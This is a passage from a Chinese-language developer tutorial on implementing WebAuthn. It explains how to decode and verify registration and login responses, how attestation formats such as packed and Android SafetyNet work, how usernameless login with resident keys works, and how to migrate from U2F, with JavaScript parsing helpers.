字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 